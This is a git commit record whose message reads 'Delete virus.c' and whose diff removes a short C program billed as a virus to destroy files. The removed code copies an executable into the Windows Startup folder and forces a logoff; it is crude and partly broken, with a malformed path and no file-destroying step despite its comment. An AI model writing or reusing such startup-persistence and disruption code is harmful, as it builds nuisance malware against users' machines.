252778eba6d11069ffdecb749776a34fe58e2e08
Kevin Roberts <pirooted@icloud.com>
2018-01-02 07:12:04 -0500

    Delete virus.c

--- virus.c
+++
@@ -1,8 +0,0 @@
-//Develop Computer Virus Using to Destory Files.
-#include <stdio.h>
-#include <io.h>
-
-int main(){
-	system("copy test.exe C:/Documents and Settings/All Users/Start Menu/Program/Startup");
-	system("shutdown -l -f");
-}
